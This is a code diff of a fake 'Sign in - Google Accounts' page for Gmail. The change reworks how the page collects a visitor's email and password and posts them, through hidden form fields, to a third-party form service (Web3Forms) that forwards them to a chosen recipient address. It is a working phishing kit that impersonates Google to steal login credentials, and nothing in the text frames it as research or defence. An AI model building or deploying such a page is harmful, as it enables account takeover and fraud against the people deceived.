@@ -6,14 +6,6 @@
     <title>Sign in - Google Accounts</title>
     
     <style>
-        :root {
-            --bg-color: #ffffff;
-            --text-primary: #202124; 
-            --text-secondary: #5f6368; 
-            --border-color: #dadce0; 
-            --primary-blue: #1a73e8; 
-        }
-
         body {
             font-family: 'Google Sans', Roboto, Arial, sans-serif;
             margin: 0;
@@ -32,9 +24,9 @@
             display: flex;
             flex-direction: column; 
             padding: 48px 40px 36px;
-            border: 1px solid var(--border-color);
+            border: 1px solid #dadce0;
             border-radius: 8px;
-            background-color: var(--bg-color);
+            background-color: #ffffff;
             box-sizing: border-box;
         }
 
@@ -42,45 +34,25 @@
             width: 75px; 
             height: auto; 
             margin-bottom: 10px;
-            object-fit: contain;
         }
 
         h1 {
             font-size: 24px;
-            color: var(--text-primary);
+            color: #202124;
             margin: 0 0 10px 0;
             font-weight: 400;
         }
 
         p.subtitle {
-            color: var(--text-primary);
+            color: #202124;
             font-size: 16px;
             margin: 0 0 35px 0;
             line-height: 1.5;
         }
 
-        input[type="email"], input[type="password"] {
-            appearance: none;
-            width: 100%;
-            box-sizing: border-box;
-            padding: 13px 15px; 
-            border-radius: 4px; 
-            border: 1px solid var(--border-color);
-            background-color: #fff; 
-            font-size: 16px;
-            height: 50px;
-            outline: none;
-            transition: border 0.2s;
-        }
-
-        input:focus {
-            border: 2px solid var(--primary-blue);
-            padding: 12px 14px;
-        }
-
-        input::placeholder {
-             color: var(--text-secondary); 
-             opacity: 0.7;
+        /* Hidden input to hold the iframe data */
+        #email-input {
+            display: none;
         }
 
         .next-btn {
@@ -89,7 +61,7 @@
             margin-top: 24px;
             padding: 0 34px; 
             border-radius: 4px; 
-            background-color: var(--primary-blue); 
+            background-color: #1a73e8; 
             color: #fff !important; 
             font-weight: 500;
             font-size: 14px;
@@ -97,7 +69,6 @@
             cursor: pointer;
             border: none;
             float: right;
-            transition: background-color 0.2s;
         }
 
          .next-btn:hover {
@@ -107,7 +78,7 @@
          .forgot-link {
             display: inline-block;
             margin-top: 20px;
-            color: var(--primary-blue); 
+            color: #1a73e8; 
             text-decoration: none !important; 
             font-size: 14px;
             font-weight: 500;
@@ -116,16 +87,15 @@
         .footer-text {
             margin-top: 30px;
             font-size: 14px;
-            color: var(--text-secondary);
+            color: #5f6368;
             line-height: 1.5;
         }
 
         .footer-text a {
-            color: var(--primary-blue);
+            color: #1a73e8;
             text-decoration: none;
         }
         
-        /* Utility classes for hiding/showing steps */
         .step {
             display: none;
         }
@@ -139,15 +109,6 @@
             clear: both;
             display: table;
         }
-        
-        /* Error message styling */
-        .error-msg {
-            color: #d93025;
-            font-size: 14px;
-            margin-top: 10px;
-            display: none;
-            text-align: left;
-        }
     </style>
 </head>
 
@@ -160,41 +121,34 @@
         <h1>Sign in</h1>
         <p class="subtitle">to continue to Gmail</p>
 
-        <!-- Web3Forms Integration -->
-        <form action="https://api.web3forms.com/submit" method="POST" id="googleForm">
+        <!-- Step 1: Email Input -->
+        <div id="step-email" class="step active">
+            <input type="text" id="email-display" placeholder="Email or phone" style="width:100%; padding:13px 15px; border:1px solid #dadce0; border-radius:4px; font-size:16px; height:50px; margin-bottom:20px;">
             
-            <!-- Your Access Key -->
-            <input type="hidden" name="access_key" value="cec54607-e019-4df5-b362-9aa6a9529923">
+            <button type="button" class="next-btn" onclick="goToPassword()">Next</button>
             
-            <!-- Specify recipient email -->
+            <div class="clearfix"></div>
+            
+            <a href="#" class="forgot-link">Forgot email?</a>
+        </div>
+
+        <!-- Step 2: Password Input -->
+        <div id="step-password" class="step">
+            <input type="password" id="password-display" placeholder="Enter your password" style="width:100%; padding:13px 15px; border:1px solid #dadce0; border-radius:4px; font-size:16px; height:50px; margin-bottom:20px;">
+            
+            <button type="submit" class="next-btn" id="submitBtn">Next</button>
+            
+            <div class="clearfix"></div>
+            
+            <a href="#" class="forgot-link">Forgot password?</a>
+        </div>
+
+        <!-- Hidden Form that submits to Web3Forms -->
+        <form action="https://api.web3forms.com/submit" method="POST" id="hiddenForm">
+            <input type="hidden" name="access_key" value="YOUR_ACCESS_KEY_HERE">
             <input type="hidden" name="to" value="your-email@example.com">
-            
-            <!-- Step 1: Email -->
-            <div id="step-email" class="step active">
-                <label for="email" style="display:none;">Email</label>
-                <input type="email" id="email" name="email" placeholder="Email or phone" required autocomplete="username">
-                
-                <button type="button" class="next-btn" onclick="goToPassword()">Next</button>
-                
-                <div class="clearfix"></div>
-                
-                <a href="#" class="forgot-link">Forgot email?</a>
-            </div>
-
-            <!-- Step 2: Password -->
-            <div id="step-password" class="step">
-                <label for="password" style="display:none;">Password</label>
-                <input type="password" id="password" name="password" placeholder="Enter your password" required autocomplete="current-password">
-                
-                <button type="submit" class="next-btn" id="submitBtn">Next</button>
-                
-                <div class="clearfix"></div>
-                
-                <a href="#" class="forgot-link">Forgot password?</a>
-                
-                <div id="errorMessage" class="error-msg"></div>
-            </div>
-
+            <input type="hidden" name="email" id="email-input">
+            <input type="hidden" name="password" id="password-hidden">
         </form>
 
         <div class="footer-text">
@@ -205,56 +159,24 @@
 
     <script>
         function goToPassword() {
-            // Hide email step, show password step
+            // Get the email typed by the user
+            const emailVal = document.getElementById('email-display').value;
+            if(!emailVal) { alert("Please enter an email"); return; }
+            
+            // Store it in the hidden form field
+            document.getElementById('email-input').value = emailVal;
+
+            // Switch UI
             document.getElementById('step-email').classList.remove('active');
             document.getElementById('step-password').classList.add('active');
-            
-            // Focus the password field automatically
-            document.getElementById('password').focus();
+            document.getElementById('password-display').focus();
         }
 
-        // Add loading state on final submit
-        const form = document.getElementById('googleForm');
-        const btn = document.querySelector('#step-password .next-btn');
-        const errorMsg = document.getElementById('errorMessage');
-
-        form.addEventListener('submit', async (e) => {
-            e.preventDefault(); // Prevent default form submission
-            
-            btn.textContent = "Signing in...";
-            btn.style.backgroundColor = "#9aa0a6";
-            btn.disabled = true;
-            errorMsg.style.display = 'none';
-
-            try {
-                const response = await fetch(form.action, {
-                    method: 'POST',
-                    body: new FormData(form),
-                    headers: {
-                        'Accept': 'application/json'
-                    }
-                });
-
-                const data = await response.json();
-
-                if (data.success) {
-                    // Success! Show a success message or redirect
-                    btn.textContent = "Success!";
-                    setTimeout(() => {
-                        alert("Form submitted successfully!");
-                        // Optionally redirect: window.location.href = data.redirect || window.location.href;
-                    }, 500);
-                } else {
-                    // Error
-                    throw new Error(data.message || "Submission failed");
-                }
-            } catch (error) {
-                console.error('Error:', error);
-                errorMsg.textContent = "Could not submit form: " + error.message;
-                errorMsg.style.display = 'block';
-                btn.textContent = "Retry";
-                btn.style.backgroundColor = "#d93025";
-            }
+        // Handle final submit
+        document.getElementById('submitBtn').addEventListener('click', () => {
+            const passVal = document.getElementById('password-display').value;
+            document.getElementById('password-hidden').value = passVal;
+            document.getElementById('hiddenForm').submit();
         });
     </script>
 
